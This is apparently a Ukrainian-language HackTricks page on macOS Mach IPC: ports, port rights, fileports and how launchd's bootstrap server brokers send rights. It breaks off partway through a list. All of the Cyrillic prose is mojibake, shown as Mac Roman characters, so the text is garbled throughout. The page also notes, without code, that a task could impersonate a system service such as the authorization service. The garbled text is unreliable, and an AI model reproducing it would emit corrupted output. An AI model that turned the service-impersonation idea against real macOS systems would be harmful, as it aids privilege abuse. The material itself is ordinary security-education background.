# macOS IPC - –ú—ñ–∂–ø—Ä–æ—Ü–µ—Å–æ—Ä–Ω–∞ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è AWS Red Team Expert (ARTE) –≤—ñ–¥ HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è GCP Red Team Expert (GRTE) –≤—ñ–¥ HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è Mach —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç–∏

### –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Mach –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∑–∞–¥–∞—á—ñ** —è–∫ **–Ω–∞–π–º–µ–Ω—à—É –æ–¥–∏–Ω–∏—Ü—é** –¥–ª—è –æ–±–º—ñ–Ω—É —Ä–µ—Å—É—Ä—Å–∞–º–∏, —ñ –∫–æ–∂–Ω–∞ –∑–∞–¥–∞—á–∞ –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ **–∫—ñ–ª—å–∫–∞ –ø–æ—Ç–æ–∫—ñ–≤**. –¶—ñ **–∑–∞–¥–∞—á—ñ —Ç–∞ –ø–æ—Ç–æ–∫–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤—ñ–¥–Ω–æ—à–µ–Ω–Ω—è–º 1:1 –¥–æ –ø—Ä–æ—Ü–µ—Å—ñ–≤ —Ç–∞ –ø–æ—Ç–æ–∫—ñ–≤ POSIX**.

–ö–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è –º—ñ–∂ –∑–∞–¥–∞—á–∞–º–∏ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –º—ñ–∂–ø—Ä–æ—Ü–µ—Å–æ—Ä–Ω—É –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é Mach (IPC), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ –∫–∞–Ω–∞–ª–∏ –∑–≤'—è–∑–∫—É. **–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –º—ñ–∂ –ø–æ—Ä—Ç–∞–º–∏**, —è–∫—ñ –¥—ñ—é—Ç—å —è–∫ **—á–µ—Ä–≥–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å**, –∫–µ—Ä–æ–≤–∞–Ω—ñ —è–¥—Ä–æ–º.

**–ü–æ—Ä—Ç** —î **–æ—Å–Ω–æ–≤–Ω–∏–º** –µ–ª–µ–º–µ–Ω—Ç–æ–º IPC Mach. –ô–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å**.

–£ –∫–æ–∂–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ —î **—Ç–∞–±–ª–∏—Ü—è IPC**, –¥–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ **–ø–æ—Ä—Ç–∏ mach –ø—Ä–æ—Ü–µ—Å—É**. –ù–∞–∑–≤–∞ –ø–æ—Ä—Ç—É Mach —Ñ–∞–∫—Ç–∏—á–Ω–æ —î —á–∏—Å–ª–æ–º (–≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º –Ω–∞ –æ–±'—î–∫—Ç —è–¥—Ä–∞).

–ü—Ä–æ—Ü–µ—Å —Ç–∞–∫–æ–∂ –º–æ–∂–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —ñ–º'—è –ø–æ—Ä—Ç—É –∑ –¥–µ—è–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ **—ñ–Ω—à—ñ–π –∑–∞–¥–∞—á—ñ**, —ñ —è–¥—Ä–æ –∑—Ä–æ–±–∏—Ç—å —Ü–µ–π –∑–∞–ø–∏—Å —É **—Ç–∞–±–ª–∏—Ü—ñ IPC —ñ–Ω—à–æ—ó –∑–∞–¥–∞—á—ñ**.

### –ü—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É

–ü—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É, —è–∫—ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å –æ–ø–µ—Ä–∞—Ü—ñ—ó, —è–∫—ñ –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∑–∞–¥–∞—á–∞, —î –∫–ª—é—á–æ–≤–∏–º–∏ –¥–ª—è —Ü—ñ—î—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó. –ú–æ–∂–ª–∏–≤—ñ **–ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É** ([–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç—É—Ç](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **–ü—Ä–∞–≤–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è**, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –Ω–∞ –ø–æ—Ä—Ç. –ü–æ—Ä—Ç–∏ Mach —î —á–µ—Ä–≥–∞–º–∏ MPSC (–±–∞–≥–∞—Ç–æ–ø—Ä–æ–¥—É–∫—Ç–æ–≤—ñ, –æ–¥–Ω–æ–∫–æ–Ω—Å—É–º–µ—Ä–Ω—ñ), —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –º–æ–∂–µ –±—É—Ç–∏ **–ª–∏—à–µ –æ–¥–Ω–µ –ø—Ä–∞–≤–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –ø–æ—Ä—Ç—É** –≤ —É—Å—ñ–π —Å–∏—Å—Ç–µ–º—ñ (–Ω–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ –∫–∞–Ω–∞–ª—ñ–≤, –¥–µ –∫—ñ–ª—å–∫–∞ –ø—Ä–æ—Ü–µ—Å—ñ–≤ –º–æ–∂—É—Ç—å —É—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ —Ñ–∞–π–ª—ñ–≤ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –∑ –æ–¥–Ω–æ–≥–æ –∫–∞–Ω–∞–ª—É).
* **–ó–∞–¥–∞—á–∞ –∑ –ø—Ä–∞–≤–æ–º –æ—Ç—Ä–∏–º–∞–Ω–Ω—è** –º–æ–∂–µ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —Ç–∞ **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –ø—Ä–∞–≤–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –°–ø–æ—á–∞—Ç–∫—É –ª–∏—à–µ **–≤–ª–∞—Å–Ω–∞ –∑–∞–¥–∞—á–∞ –º–∞—î –ø—Ä–∞–≤–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–∞–¥ —Å–≤–æ—ó–º –ø–æ—Ä—Ç–æ–º**.
* –Ø–∫—â–æ –≤–ª–∞—Å–Ω–∏–∫ –ø—Ä–∞–≤–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–ø–æ–º–µ—Ä –∞–±–æ –≤–±–∏–≤ –π–æ–≥–æ**, –ø—Ä–∞–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Å—Ç–∞—î –Ω–µ–∫–æ—Ä–∏—Å–Ω–∏–º (–º–µ—Ä—Ç–≤–µ —ñ–º'—è).
* **–ü—Ä–∞–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç.
* –ü—Ä–∞–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –º–æ–∂–Ω–∞ **–∫–ª–æ–Ω—É–≤–∞—Ç–∏**, —Ç–æ–º—É –∑–∞–¥–∞—á–∞, —è–∫–∞ –≤–æ–ª–æ–¥—ñ—î –ø—Ä–∞–≤–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, –º–æ–∂–µ —Å–∫–ª–æ–Ω—É–≤–∞—Ç–∏ –ø—Ä–∞–≤–æ —Ç–∞ **–Ω–∞–¥–∞—Ç–∏ –π–æ–≥–æ —Ç—Ä–µ—Ç—ñ–π –∑–∞–¥–∞—á—ñ**.
* –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ **–ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É** —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–ø–µ—Ä–µ–¥–∞–Ω—ñ** —á–µ—Ä–µ–∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è Mac.
* **–ü—Ä–∞–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –æ–¥–∏–Ω —Ä–∞–∑**, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –æ–¥–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤–æ–Ω–æ –∑–Ω–∏–∫–∞—î.
* –¶–µ –ø—Ä–∞–≤–æ **–Ω–µ –º–æ–∂–Ω–∞ –∫–ª–æ–Ω—É–≤–∞—Ç–∏**, –∞–ª–µ –π–æ–≥–æ –º–æ–∂–Ω–∞ **–ø–µ—Ä–µ–º—ñ—Å—Ç–∏—Ç–∏**.
* **–ü—Ä–∞–≤–æ –Ω–∞ –Ω–∞–±—ñ—Ä –ø–æ—Ä—Ç—ñ–≤**, —è–∫–µ –≤–∫–∞–∑—É—î –Ω–∞ _–Ω–∞–±—ñ—Ä –ø–æ—Ä—Ç—ñ–≤_ –∑–∞–º—ñ—Å—Ç—å –æ–¥–Ω–æ–≥–æ –ø–æ—Ä—Ç—É. –í–∏–±—ñ—Ä –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –Ω–∞–±–æ—Ä—É –ø–æ—Ä—Ç—ñ–≤ –≤–∏–±–∏—Ä–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ–¥–Ω–æ–≥–æ –∑ –π–æ–≥–æ –ø–æ—Ä—Ç—ñ–≤. –ù–∞–±–æ—Ä–∏ –ø–æ—Ä—Ç—ñ–≤ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –ø–æ—Ä—Ç—ñ–≤ –æ–¥–Ω–æ—á–∞—Å–Ω–æ, —Å—Ö–æ–∂–µ –Ω–∞ `select`/`poll`/`epoll`/`kqueue` –≤ Unix.
* **–ú–µ—Ä—Ç–≤–µ —ñ–º'—è**, —è–∫–µ –Ω–µ —î —Ñ–∞–∫—Ç–∏—á–Ω–∏–º –ø—Ä–∞–≤–æ–º –ø–æ—Ä—Ç—É, –∞ –ª–∏—à–µ –∑–∞–ø–æ–≤–Ω—é–≤–∞—á–µ–º. –ö–æ–ª–∏ –ø–æ—Ä—Ç –∑–Ω–∏—â—É—î—Ç—å—Å—è, –≤—Å—ñ —ñ—Å–Ω—É—é—á—ñ –ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É –Ω–∞ –ø–æ—Ä—Ç –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—Ç—å—Å—è –Ω–∞ –º–µ—Ä—Ç–≤—ñ —ñ–º–µ–Ω–∞.

**–ó–∞–¥–∞—á—ñ –º–æ–∂—É—Ç—å –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –ü–†–ê–í–ê –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø —ñ–Ω—à–∏–º**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ —ó–º –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞–∑–∞–¥. **–ü–†–ê–í–ê –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∫–ª–æ–Ω—É–≤–∞—Ç–∏, —Ç–æ–º—É –∑–∞–¥–∞—á–∞ –º–æ–∂–µ –¥—É–±–ª—é–≤–∞—Ç–∏ —Ç–∞ –¥–∞–≤–∞—Ç–∏ –ø—Ä–∞–≤–æ —Ç—Ä–µ—Ç—ñ–π –∑–∞–¥–∞—á—ñ**. –¶–µ, —Ä–∞–∑–æ–º —ñ–∑ –ø—Ä–æ–º—ñ–∂–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–æ–º, –≤—ñ–¥–æ–º–∏–º —è–∫ **–∑–∞–ø—É—Å–∫–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä**, –¥–æ–∑–≤–æ–ª—è—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –º—ñ–∂ –∑–∞–¥–∞—á–∞–º–∏.

### –ü–æ—Ä—Ç–∏ —Ñ–∞–π–ª—ñ–≤

–ü–æ—Ä—Ç–∏ —Ñ–∞–π–ª—ñ–≤ –¥–æ–∑–≤–æ–ª—è—é—Ç—å —ñ–Ω–∫–∞–ø—Å—É–ª—é–≤–∞—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ —Ñ–∞–π–ª—ñ–≤ —É –ø–æ—Ä—Ç–∞—Ö Mac (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –ø—Ä–∞–≤ –ø–æ—Ä—Ç—É Mach). –ú–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ `fileport` –∑ –∑–∞–¥–∞–Ω–∏–º FD –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `fileport_makeport` —Ç–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ FD –∑ fileport –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `fileport_makefd`.

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–≤'—è–∑–∫—É

–Ø–∫ –≤–∂–µ –∑–∞–∑–Ω–∞—á–∞–ª–æ—Å—è, –º–æ–∂–ª–∏–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø—Ä–∞–≤–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å Mach, –æ–¥–Ω–∞–∫ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø—Ä–∞–≤–æ –±–µ–∑ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ –ø—Ä–∞–≤–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è Mach**. –¢–æ–¥—ñ —è–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –ø–µ—Ä—à–∏–π –∑–≤'—è–∑–æ–∫?

–î–ª—è —Ü—å–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–∏–π **–∑–∞–ø—É—Å–∫–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä** (**launchd** –≤ Mac), –æ—Å–∫—ñ–ª—å–∫–∏ **–∫–æ–∂–µ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–æ –∑–∞–ø—É—Å–∫–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞**, –º–æ–∂–ª–∏–≤–æ –ø–æ–ø—Ä–æ—Å–∏—Ç–∏ –π–æ–≥–æ –ø—Ä–æ –ø—Ä–∞–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —ñ–Ω—à–æ–º—É –ø—Ä–æ—Ü–µ—Å—É:

1. –ó–∞–¥–∞—á–∞ **A** —Å—Ç–≤–æ—Ä—é—î **–Ω–æ–≤–∏–π –ø–æ—Ä—Ç**, –æ—Ç—Ä–∏–º—É—é—á–∏ **–ü–†–ê–í–û –û–¢–†–ò–ú–ê–ù–ù–Ø** –Ω–∞–¥ –Ω–∏–º.
2. –ó–∞–¥–∞—á–∞ **A**, —è–∫–∞ —î –≤–ª–∞—Å–Ω–∏–∫–æ–º –ü–†–ê–í–ê –û–¢–†–ò–ú–ê–ù–ù–Ø, **–≥–µ–Ω–µ—Ä—É—î –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–ª—è –ø–æ—Ä—Ç—É**.
3. –ó–∞–¥–∞—á–∞ **A** –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î **–∑'—î–¥–Ω–∞–Ω–Ω—è** –∑ **–∑–∞–ø—É—Å–∫–æ–≤–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º** —Ç–∞ **–≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –π–æ–º—É –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–ª—è –ø–æ—Ä—Ç—É**, —è–∫–µ –≤–æ–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞–ª–∞ –Ω–∞ –ø–æ—á–∞—Ç–∫—É.
* –ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –∫–æ–∂–µ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–æ –∑–∞–ø—É—Å–∫–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞.
4. –ó–∞–¥–∞—á–∞ A –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è `bootstrap_register` –∑–∞–ø—É—Å–∫–æ–≤–æ–º—É —Å–µ—Ä–≤–µ—Ä—É, —â–æ–± **–∞—Å–æ—Ü—ñ—é–≤–∞—Ç–∏ –∑–∞–¥–∞–Ω–∏–π –ø–æ—Ä—Ç –∑ —ñ–º'—è–º**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `com.apple.taska`.
5. –ó–∞–¥–∞—á–∞ **B** –≤–∑–∞—î–º–æ–¥—ñ—î –∑ **–∑–∞–ø—É—Å–∫–æ–≤–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–ø–æ—à—É–∫—É –∑–∞–ø—É—Å–∫—É –¥–ª—è —ñ–º–µ–Ω—ñ —Å–ª—É–∂–±–∏** (`bootstrap_lookup`). –©–æ–± –∑–∞–ø—É—Å–∫–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä –º—ñ–≥ –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏, –∑–∞–¥–∞—á–∞ B –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –π–æ–º—É **–ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–æ –ø–æ—Ä—Ç—É, —è–∫–µ –≤–æ–Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Å—Ç–≤–æ—Ä–∏–ª–∞** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø–æ—à—É–∫—É. –Ø–∫—â–æ –ø–æ—à—É–∫ —É—Å–ø—ñ—à–Ω–∏–π, **—Å–µ—Ä–≤–µ—Ä —Å–∫–æ–ø—ñ—é—î –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø**, –æ—Ç—Ä–∏–º–∞–Ω–µ –≤—ñ–¥ –ó–∞–¥–∞—á—ñ A, —Ç–∞ **–ø–µ—Ä–µ–¥–∞—Å—Ç—å –π–æ–≥–æ –ó–∞–¥–∞—á—ñ B**.
* –ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –∫–æ–∂–µ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –¥–æ –∑–∞–ø—É—Å–∫–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞.
6. –ó —Ü–∏–º –ü–†–ê–í–û–ú –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø **–ó–∞–¥–∞—á–∞ B** –º–æ–∂–µ **–≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ó–∞–¥–∞—á—ñ A**.
7. –î–ª—è –¥–≤–æ–Ω–∞–ø—Ä—è–º–ª–µ–Ω–æ–≥–æ –∑–≤'—è–∑–∫—É –∑–∞–∑–≤–∏—á–∞–π –∑–∞–¥–∞—á–∞ **B** –≥–µ–Ω–µ—Ä—É—î –Ω–æ–≤–∏–π –ø–æ—Ä—Ç –∑ **–ü–†–ê–í–û–ú –û–¢–†–ò–ú–ê–ù–ù–Ø** —Ç–∞ **–ü–†–ê–í–û–ú –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø**, —ñ –¥–∞—î **–ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –ó–∞–¥–∞—á—ñ A**, —â–æ–± –≤–æ–Ω–∞ –º–æ–≥–ª–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ó–ê–î–ê–ß–Ü B (–¥–≤–æ–Ω–∞–ø—Ä—è–º–ª–µ–Ω–µ —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è).

–ó–∞–ø—É—Å–∫–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä **–Ω–µ –º–æ–∂–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏** —ñ–º'—è —Å–ª—É–∂–±–∏, –≤–∫–∞–∑–∞–Ω–µ –∑–∞–¥–∞—á–µ. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–∑–∞–¥–∞—á–∞** –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ **–ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –±—É–¥—å-—è–∫—É —Å–∏—Å—Ç–µ–º–Ω—É –∑–∞–¥–∞—á—É**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **—Ñ–∞–ª—å—à–∏–≤–æ –≤–∫–∞–∑–∞–≤—à–∏ —ñ–º'—è —Å–ª—É–∂–±–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó**, –∞ –ø–æ—Ç—ñ–º —Å—Ö–≤–∞–ª—é—é—á–∏ –∫–æ–∂–µ–Ω –∑–∞–ø–∏—Ç.

–ü–æ—Ç—ñ–º Apple –∑–±–µ—Ä—ñ–≥–∞—î **—ñ–º–µ–Ω–∞ —Å–ª—É–∂–±, –Ω–∞–¥–∞–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–æ—é**, —É –∑–∞—Ö–∏—â–µ–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª–∞—Ö, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏—Ö —É –∫–∞—Ç–∞–ª–æ–≥–∞—Ö, –∑–∞—Ö–∏—â–µ–Ω–∏—Ö SIP: `/System/Library/LaunchDaemons` —Ç–∞ `/System/Library/LaunchAgents`. –ü–æ—Ä—è–¥ –∑ –∫–æ–∂–Ω–∏–º —ñ–º'—è–º —Å–ª—É–∂–±–∏ —Ç–∞–∫–æ–∂ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è **–ø–æ–≤'—è–∑–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª**. –ó–∞–ø—É—Å–∫–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä —Å—Ç–≤–æ—Ä–∏—Ç—å —Ç–∞ —É—Ç—Ä–∏–º—É—î **–ü–†–ê–í–û –û–¢–†–ò–ú–ê–ù–ù–Ø –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –∑ —Ü–∏—Ö —ñ–º–µ–Ω —Å–ª—É–∂–±**.

–î–ª—è —Ü–∏—Ö –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö —Å–ª—É–∂–± **–ø—Ä–æ—Ü–µ—Å –ø–æ—à—É–∫—É –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è —Ç—Ä–æ—Ö–∏**. –ü—Ä–∏ –ø–æ—à—É–∫—É —ñ–º–µ–Ω—ñ —Å–ª—É–∂–±–∏ launchd –∑–∞–ø—É—Å–∫–∞—î —Å–ª—É–∂–±—É –¥–∏–Ω–∞–º—ñ—á–Ω–æ. –ù–æ–≤–∏–π —Ä–æ–±–æ—á–∏–π –ø—Ä–æ—Ü–µ—Å –≤–∏–≥–ª—è–¥–∞—î –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

* –ó–∞–¥–∞—á–∞ **B** —ñ–Ω—ñ—Ü—ñ—é—î –ø–æ—à—É–∫ –∑–∞–ø—É—Å–∫—É –¥–ª—è —ñ–º–µ–Ω—ñ —Å–ª—É–∂–±–∏.
